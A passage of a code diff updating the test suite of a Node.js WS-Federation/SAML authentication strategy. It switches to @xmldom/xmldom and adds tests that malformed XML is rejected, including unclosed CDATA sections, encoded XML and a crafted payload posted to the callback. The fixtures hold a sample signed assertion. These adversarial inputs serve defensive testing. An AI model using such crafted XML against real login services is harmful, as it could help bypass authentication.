'<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>';\n+      return domParser.parseFromString('<trust:RequestedSecurityToken xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestedSecurityToken>', 'text/xml');\n     };\n \n-    strategy._saml.validateSamlAssertion = function(token, done) {\n-      expect(token).to.equal('<trust:RequestedSecurityToken>...</trust:RequestedSecurityToken>');\n+    strategy._saml.validateSamlAssertion = function(token, _options, done) {\n+      expect(token).to.equal('<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>');\n       done(null, { id: '1234' });\n     };\n-    \n+\n     describe('issuing authorization request', function() {\n-      \n+\n       describe('that redirects to service provider', function() {\n         var request, url;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .redirect(function(u) {\n-              url = u;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.session = {};\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .redirect(function(u) {\n+                url = u;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.session = {};\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should be redirected', function() {\n           var u = uri.parse(url, true);\n           expect(u.query.wctx).to.have.length(24);\n         });\n-      \n+\n         it('should save state in session', function() {\n           var u = uri.parse(url, true);\n-        \n+\n           expect(request.session['wsfed:example'].state).to.have.length(24);\n           expect(request.session['wsfed:example'].state).to.equal(u.query.wctx);\n         });\n       });\n     });\n-    \n+\n     describe('processing response to authorization request', function() {\n-      \n+\n       describe('that was approved', function() {\n         var request, user, info;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.wresult = '<trust:RequestSecurityTokenResponseCollection>...</trust:RequestSecurityTokenResponseCollection>';\n-              req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['wsfed:example'] = {};\n-              req.session['wsfed:example']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.wresult = '<trust:RequestSecurityTokenResponseCollection xmlns:trust=\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\">...</trust:RequestSecurityTokenResponseCollection>';\n+                req.body.wctx = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['wsfed:example'] = {};\n+                req.session['wsfed:example']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply user', function() {\n           expect(user).to.be.an('object');\n           expect(user.id).to.equal('1234');\n         });\n-  \n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Hello');\n         });\n-      \n+\n         it('should remove state from session', function() {\n           expect(request.session['wsfed:example']).to.be.undefined;\n         });\n       });\n     });\n   });\n-});\n+});\n\\ No newline at end of file\n```\n\nFilename: test/utils.js:\n```\n@@ -1,14 +1,13 @@\nvar expect = require('chai').expect;\n \n-var lib   = require('../lib/passport-wsfed-saml2');\n var utils = require('../lib/passport-wsfed-saml2/utils');\n \n describe('utils', function () {\n   describe('parseSamlAssertion', function () {\n     it('should work', function (done) {\n       var assertion = utils.parseSamlAssertion('<t:RequestSecurityTokenResponse xmlns:t=\"http://schemas.xmlsoap.org/ws/2005/02/trust\"></t:RequestSecurityTokenResponse>');\n       expect(assertion.childNodes.length)\n-        .to.equal(1);\n+          .to.equal(1);\n       done();\n     });\n\n@@ -23,9 +22,14 @@\ndescribe('utils', function () {\n \n       var err = parse();\n       expect(err.name)\n-        .to.equal('SamlAssertionParserError');\n-      expect(err.detail)\n-        .to.equal('end tag name: div is not match the current start tagName:t:RequestSecurityTokenResponse');\n+          .to.equal('SamlAssertionParserError');\n+      expect(err.detail.message)\n+          .to.equal('Opening and ending tag mismatch: \"AssertionAssertion\" != \"div\"');\n+      done();\n+    });\n+\n+    it('should throw an error with invalid xml = \"\"<doc><![CDATA[</doc>\"\"', function (done) {\n+      expect(() => { utils.parseSamlAssertion('<doc><![CDATA[</doc>'); }).to.throw('SAML Assertion should be a valid xml');\n       done();\n     });\n   });\n\n@@ -34,7 +38,7 @@\ndescribe('utils', function () {\n     it('should work', function (done) {\n       var response = utils.parseSamlResponse('<t:RequestSecurityTokenResponse xmlns:t=\"http://schemas.xmlsoap.org/ws/2005/02/trust\"></t:RequestSecurityTokenResponse>');\n       expect(response.childNodes.length)\n-        .to.equal(1);\n+          .to.equal(1);\n       done();\n     });\n\n@@ -49,9 +53,14 @@\ndescribe('utils', function () {\n \n       var err = parse();\n       expect(err.name)\n-        .to.equal('SamlResponseParserError');\n-      expect(err.detail)\n-        .to.equal('end tag name: div is not match the current start tagName:t:RequestSecurityTokenResponse');\n+          .to.equal('SamlResponseParserError');\n+      expect(err.detail.message)\n+          .to.equal('Opening and ending tag mismatch: \"AssertionAssertion\" != \"div\"');\n+      done();\n+    });\n+\n+    it('should throw an error with invalid xml = \"\"<doc><![CDATA[</doc>\"\"', function (done) {\n+      expect(() => { utils.parseSamlResponse('<doc><![CDATA[</doc>'); }).to.throw('SAMLResponse should be a valid xml');\n       done();\n     });\n   });\n\n@@ -60,7 +69,7 @@\ndescribe('utils', function () {\n     it('should work', function (done) {\n       var response = utils.parseWsFedResponse('<t:RequestSecurityTokenResponse xmlns:t=\"http://schemas.xmlsoap.org/ws/2005/02/trust\"></t:RequestSecurityTokenResponse>');\n       expect(response.childNodes.length)\n-        .to.equal(1);\n+          .to.equal(1);\n       done();\n     });\n\n@@ -75,10 +84,159 @@\ndescribe('utils', function () {\n \n       var err = parse();\n       expect(err.name)\n-        .to.equal('WSFederationResultParseError');\n-      expect(err.detail)\n-        .to.equal('end tag name: div is not match the current start tagName:t:RequestSecurityTokenResponse');\n+          .to.equal('WSFederationResultParseError');\n+      expect(err.detail.message)\n+          .to.equal('Opening and ending tag mismatch: \"AssertionAssertion\" != \"div\"');\n+      done();\n+    });\n+\n+    it('should throw an error with invalid xml = \"\"<doc><![CDATA[</doc>\"\"', function (done) {\n+      expect(() => { utils.parseWsFedResponse('<doc><![CDATA[</doc>'); }).to.throw('wresult should be a valid xml');\n       done();\n     });\n   });\n-});\n+\n+  describe('parseXmlString', () => {\n+    it(\"should parse XML string\", () => {\n+      const xml = \"<foo><bar>baz</bar></foo>\";\n+      const result = utils.parseXmlString(xml);\n+      expect(result.documentElement.nodeName).to.equal(\"foo\");\n+      expect(result.documentElement.firstChild.nodeName).to.equal(\"bar\");\n+      expect(result.documentElement.firstChild.firstChild.nodeValue).to.equal(\n+          \"baz\"\n+      );\n+    });\n+\n+    it(\"should throw on = that is not attached to an attribute\", () => {\n+      const xml = \"<foo><bar =>baz</bar></foo>\";\n+      expect(() => utils.parseXmlString(xml)).to.throw('Opening and ending tag mismatch: \"foo\" != \"bar\"');\n+    });\n+\n+    it(\"should throw on closing elements without opening elements\", () => {\n+      const xml = \"<foo></bar></foo>\";\n+      expect(() => utils.parseXmlString(xml)).to.throw('Opening and ending tag mismatch: \"foo\" != \"bar\"');\n+    });\n+\n+    describe(\"CDATA sections\", () => {\n+      it(\"should handle CDATA sections\", () => {\n+        const xml = \"<foo><![CDATA[<bar>baz</bar>]]></foo>\";\n+        const result = utils.parseXmlString(xml);\n+        expect(result.documentElement.nodeName).to.equal(\"foo\");\n+        expect(result.documentElement.firstChild.nodeValue).to.equal(\n+            \"<bar>baz</bar>\"\n+        );\n+      });\n+\n+      it(\"should not throw CDATA sections on second line\", () => {\n+        const xml = `<foo>\n+          <![CDATA[<bar>baz</bar>]]>\n+        </foo>`;\n+        const result = utils.parseXmlString(xml);\n+        expect(result.documentElement.nodeName).to.equal(\"foo\");\n+      });\n+\n+      it(\"should not throw multi line CDATA section starting on first line\", () => {\n+        const xml = `<foo><![CDATA[\n+        \n+        \n+        This should all be ignored\n+        \n+        ]]>\n+        </foo>\n+        `;\n+        const result = utils.parseXmlString(xml);\n+        expect(result.documentElement.nodeName).to.equal(\"foo\");\n+      });\n+\n+      it(\"should not throw multi line CDATA section starting on second line\", () => {\n+        const xml = `<foo>\n+        <![CDATA[\n+        \n+        \n+        This should all be ignored\n+        \n+        ]]>\n+        </foo>\n+        `;\n+        const result = utils.parseXmlString(xml);\n+        expect(result.documentElement.nodeName).to.equal(\"foo\");\n+      });\n+\n+      it(\"should throw if document is single line unclosed CDATA section\", () => {\n+        const xml = `<![CDATA[ this is an unclosed CDATA section`;\n+        expect(() => utils.parseXmlString(xml)).to.throw('Invalid CDATA starting at position 0');\n+      });\n+\n+      it(\"should throw if document is single line closed CDATA section\", () => {\n+        const xml = `<![CDATA[ this is a closed CDATA section ]]>`;\n+        expect(() => utils.parseXmlString(xml)).to.throw('CDATA outside of element');\n+      });\n+\n+      it(\"should throw if document is multi line unclosed CDATA section\", () => {\n+        const xml = `<![CDATA[ \n+          this is an unclosed CDATA section\n+        `;\n+        expect(() => utils.parseXmlString(xml)).to.throw('Invalid CDATA starting at position 0');\n+      });\n+\n+      it(\"should throw with nested CDATA if no start tag\", () => {\n+        const xml = `<![CDATA[ \n+          <![CDATA should this be ignored since the other cdata is still open?\n+            this is a closed CDATA section \n+        ]]>`;\n+        expect(() => utils.parseXmlString(xml)).to.throw('CDATA outside of element');\n+      });\n+\n+      it('should not throw if the second CDATA element on a single line is unclosed', () => {\n+        const xml = `<foo>\n+          <![CDATA[ignored]]><![CDATA[\n+          \n+          just some data\n+          \n+          ]]>\n+        </foo>`;\n+        expect(() => utils.parseXmlString(xml)).to.not.throw();\n+      });\n+\n+      it(\"should not throw with nested CDATA if with start tag\", () => {\n+        const xml = `<foo><![CDATA[ \n+          <![CDATA this CDATA open should be ignored since the other CDATA is still open\n+            this is a closed CDATA section \n+        ]]></foo>`;\n+        expect(() => utils.parseXmlString(xml)).to.not.throw();\n+      });\n+\n+      it(\"should throw on unclosed CDATA sections on first line\", () => {\n+        const xml = \"<foo><![CDATA[<bar>baz</bar>></foo>\";\n+        expect(() => utils.parseXmlString(xml)).to.throw(\"Invalid CDATA starting at position 5\");\n+      });\n+\n+      it('should throw on unclosed CDATA sections with closing brackets to finish', () => {\n+        const xml = '<doc><![CDATA[</doc>]]'\n+        expect(() => utils.parseXmlString(xml)).to.throw(\"Invalid CDATA starting at position 5\");\n+      });\n+\n+      it(\"should throw on lowercase cdata sections\", () => {\n+        const xml = \"<foo><![cdata[flism</foo>\";\n+        expect(() => utils.parseXmlString(xml)).to.throw();\n+      });\n+\n+      it(\"should throw on URL encoded XML\", () => {\n+        const xml = encodeURIComponent(\"<foo></foo>\");\n+        expect(() => utils.parseXmlString(xml)).to.throw();\n+      });\n+\n+      it(\"should throw on base64 encoded XML\", () => {\n+        const xml = Buffer.from(\"<foo><![CDATA[flism></foo>\", \"utf-8\").toString(\n+            \"base64\"\n+        );\n+        expect(() => utils.parseXmlString(xml)).to.throw();\n+      });\n+\n+      it(\"should throw on unclosed CDATA element\", () => {\n+        const xml = \"<foo><![CDATA[flism></foo>\";\n+        expect(() => utils.parseXmlString(xml)).to.throw();\n+      });\n+    });\n+  });\n+});\n\\ No newline at end of file\n```\n\nFilename: test/wsfed.tests.js:\n```\n@@ -3,7 +3,7 @@\nvar server = require('./fixture/wsfed-server');\n var request = require('request');\n var cheerio = require('cheerio');\n const xpath = require('xpath');\n-const DOMParser = require('xmldom').DOMParser;\n+const DOMParser = require('@xmldom/xmldom').DOMParser;\n \n describe('wsfed', function () {\n   before(function (done) {\n\n@@ -18,18 +18,18 @@\ndescribe('wsfed', function () {\n     it('returns 400 if we have more than one Assertion element', (done) => {\n       request.get({\n         jar: request.jar(),\n-        uri: 'http://localhost:5050/login?wa=wsignin1.0&wtrealm=urn:fixture-test'\n+        uri: `${server.BASE_URL}/login?wa=wsignin1.0&wtrealm=urn:fixture-test`\n       }, function (err, response, b){\n         if(err) return done(err);\n         expect(response.statusCode)\n-          .to.equal(200);\n+            .to.equal(200);\n \n \n         const $ = cheerio.load(b);\n         const wresult = $('input[name=\"wresult\"]').attr('value');\n         const wa = $('input[name=\"wa\"]').attr('value');\n \n-        const root = new DOMParser().parseFromString(wresult);\n+        const root = new DOMParser().parseFromString(wresult, 'text/xml');\n         const assertion = xpath.select(\"//*[local-name(.)='Assertion']\", root)[0];\n \n         const copiedAssertion = assertion.cloneNode(true);\n\n@@ -39,16 +39,41 @@\ndescribe('wsfed', function () {\n \n         request.post({\n           jar: request.jar(),\n-          uri: 'http://localhost:5050/callback',\n+          uri: `${server.BASE_URL}/callback`,\n           form: { wresult: modifiedResult, wa: wa }\n         }, function (err, response, _) {\n           if (err) return done(err);\n           expect(response.statusCode).to.equal(400);\n           done();\n         });\n       });\n-    })\n+    });\n+\n+    it(`returns 400 if invalid XML - \"<doc><![CDATA[</doc>\"`, (done) => {\n+      request.get({\n+        jar: request.jar(),\n+        uri: `${server.BASE_URL}/login?wa=wsignin1.0&wtrealm=urn:fixture-test`\n+      }, function (err, response, b){\n+        if(err) return done(err);\n+        expect(response.statusCode)\n+            .to.equal(200);\n+\n+\n+        const $ = cheerio.load(b);\n+        const wa = $('input[name=\"wa\"]').attr('value');\n \n+        request.post({\n+          jar: request.jar(),\n+          uri: `${server.BASE_URL}/callback`,\n+          form: { wresult: \"<doc><![CDATA[</doc>\", wa: wa }\n+        }, function (err, response, _) {\n+          if (err) return done(err);\n+          expect(response.statusCode).to.equal(401);\n+          expect(response.body).to.contain('Unauthorized');\n+          done();\n+        });\n+      });\n+    });\n   })\n \n   describe('normal flow', function () {\n\n@@ -57,11 +82,11 @@\ndescribe('wsfed', function () {\n     before(function (done) {\n       request.get({\n         jar: request.jar(),\n-        uri: 'http://localhost:5050/login?wa=wsignin1.0&wtrealm=urn:fixture-test'\n+        uri: `${server.BASE_URL}/login?wa=wsignin1.0&wtrealm=urn:fixture-test`\n       }, function (err, response, b){\n         if(err) return done(err);\n         expect(response.statusCode)\n-          .to.equal(200);\n+            .to.equal(200);\n \n \n         $ = cheerio.load(b);\n\n@@ -70,7 +95,7 @@\ndescribe('wsfed', function () {\n \n         request.post({\n           jar: request.jar(),\n-          uri: 'http://localhost:5050/callback',\n+          uri: `${server.BASE_URL}/callback`,\n           form: { wresult: wresult, wa: wa }\n         }, function(err, response, body) {\n           if(err) return done(err);\n\n@@ -84,7 +109,7 @@\ndescribe('wsfed', function () {\n \n     it('should be valid signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -103,7 +128,7 @@\ndescribe('wsfed', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5050/callback',\n+        uri: `${server.BASE_URL}/callback`,\n         form: { wresult: '<t:RequestSecurityTokenResponse xmlns:t=\"http://schemas.xmlsoap.org/ws/2005/02/trust\"></t:RequestSecurityTokenResponse>' }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -115,7 +140,7 @@\ndescribe('wsfed', function () {\n \n     it('should return a 400', function(){\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n     });\n   });\n\n@@ -125,7 +150,7 @@\ndescribe('wsfed', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5050/callback'\n+        uri: `${server.BASE_URL}/callback`\n       }, function(err, response, body) {\n         if(err) return done(err);\n         r = response;\n\n@@ -136,7 +161,7 @@\ndescribe('wsfed', function () {\n \n     it('should redirect to idp', function(){\n       expect(r.statusCode)\n-            .to.equal(302);\n+          .to.equal(302);\n     });\n   });\n\n@@ -146,7 +171,7 @@\ndescribe('wsfed', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5050/callback',\n+        uri: `${server.BASE_URL}/callback`,\n         form: { wresult: 'foo' }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -158,7 +183,7 @@\ndescribe('wsfed', function () {\n \n     it('should return a 400', function(){\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n     });\n   });\n\n@@ -167,27 +192,27 @@\ndescribe('wsfed', function () {\n \n     before(function (done) {\n       request.post({\n-        jar: request.jar(),\n-        uri: 'http://localhost:5050/callback/wresult-with-invalid-xml',\n-        form: { wresult: '<t:RequestSecurityTokenResponse Context=\"undefined\" xmlns:t=\"http://schemas.xmlsoap.org/ws/2005/02/trust\"><t:RequestedSecurityToken></saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:1.0:assertion\" MajorVersion=\"1\" MinorVersion=\"1\" AssertionID=\"_dpEiwydz8xWGlw4HbWMg1XfOUdEpdaMC\" IssueInstant=\"2017-05-24T17:52:42.498Z\" Issuer=\"urn:fixture-test\"><saml:Conditions NotBefore=\"2017-05-24T17:52:42.498Z\" NotOnOrAfter=\"2017-05-25T01:52:42.498Z\"><saml:AudienceRestrictionCondition><saml:Audience>urn:fixture-test</saml:Audience></saml:AudienceRestrictionCondition></saml:Conditions><saml:AttributeStatement><saml:Subject><saml:NameIdentifier Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\">12345678</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"nameidentifier\"><saml:AttributeValue>12345678</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"emailaddress\"><saml:AttributeValue>jfoo@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"name\"><saml:AttributeValue>John Foo</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"givenname\"><saml:AttributeValue>John</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"surname\"><saml:AttributeValue>Foo</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthenticationStatement AuthenticationMethod=\"urn:oasis:names:tc:SAML:1.0:am:password\" AuthenticationInstant=\"2017-05-25T01:52:42.498Z\"><saml:Subject><saml:NameIdentifier Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\">12345678</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject></saml:AuthenticationStatement><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_dpEiwydz8xWGlw4HbWMg1XfOUdEpdaMC\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>fxxeOWyp3M3cVfglUEg0Fc0mVAm7QVCyrSX2Kflq8VE=</DigestValue></Reference></SignedInfo><SignatureValue>ETv7SqrEoHYP1FTLcdylyDZotyJ1uuNNCLo6sw4cm4YAnGz/OYUIssUb0s82C3NCfV5ifvryr5khnZCNfRvEWJPsIZAtaSPHeeO+x3ajIDd/qfklNBHpdEYMP2WbcqPA6pYeh+OHgAlG6srsLDO8fMymUa/T8yACIU7cwnouEaYESWRU2fqKOXpeUxB/pENiY+qxPTvxzRYld5OlR+sNAJFPIvl3V5G+vw0mx+7tZteKq7yX0djpwEoFfXAcMzvLoqLqENjxPanmVPv7qvv7dIdI0kPE6jret50sHkHpQ7XZJmGi6cNc+/kvhSHXhD3vJ0u3BP/qCCPYPHz42z+KIw==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature></saml:Assertion></t:RequestedSecurityToken></t:RequestSecurityTokenResponse>' }\n-      },\n-      function(err, response, body) {\n-        if(err) return done(err);\n-        r = response;\n-        bod = body;\n-        done();\n-      });\n+            jar: request.jar(),\n+            uri: `${server.BASE_URL}/callback/wresult-with-invalid-xml`,\n+            form: { wresult: '<t:RequestSecurityTokenResponse Context=\"undefined\" xmlns:t=\"http://schemas.xmlsoap.org/ws/2005/02/trust\"><t:RequestedSecurityToken></saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:1.0:assertion\" MajorVersion=\"1\" MinorVersion=\"1\" AssertionID=\"_dpEiwydz8xWGlw4HbWMg1XfOUdEpdaMC\" IssueInstant=\"2017-05-24T17:52:42.498Z\" Issuer=\"urn:fixture-test\"><saml:Conditions NotBefore=\"2017-05-24T17:52:42.498Z\" NotOnOrAfter=\"2017-05-25T01:52:42.498Z\"><saml:AudienceRestrictionCondition><saml:Audience>urn:fixture-test</saml:Audience></saml:AudienceRestrictionCondition></saml:Conditions><saml:AttributeStatement><saml:Subject><saml:NameIdentifier Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\">12345678</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"nameidentifier\"><saml:AttributeValue>12345678</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"emailaddress\"><saml:AttributeValue>jfoo@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"name\"><saml:AttributeValue>John Foo</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"givenname\"><saml:AttributeValue>John</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeNamespace=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims\" AttributeName=\"surname\"><saml:AttributeValue>Foo</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthenticationStatement AuthenticationMethod=\"urn:oasis:names:tc:SAML:1.0:am:password\" AuthenticationInstant=\"2017-05-25T01:52:42.498Z\"><saml:Subject><saml:NameIdentifier Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\">12345678</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject></saml:AuthenticationStatement><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_dpEiwydz8xWGlw4HbWMg1XfOUdEpdaMC\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>fxxeOWyp3M3cVfglUEg0Fc0mVAm7QVCyrSX2Kflq8VE=</DigestValue></Reference></SignedInfo><SignatureValue>ETv7SqrEoHYP1FTLcdylyDZotyJ1uuNNCLo6sw4cm4YAnGz/OYUIssUb0s82C3NCfV5ifvryr5khnZCNfRvEWJPsIZAtaSPHeeO+x3ajIDd/qfklNBHpdEYMP2WbcqPA6pYeh+OHgAlG6srsLDO8fMymUa/T8yACIU7cwnouEaYESWRU2fqKOXpeUxB/pENiY+qxPTvxzRYld5OlR+sNAJFPIvl3V5G+vw0mx+7tZteKq7yX0djpwEoFfXAcMzvLoqLqENjxPanmVPv7qvv7dIdI0kPE6jret50sHkHpQ7XZJmGi6cNc+/kvhSHXhD3vJ0u3BP/qCCPYPHz42z+KIw==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/u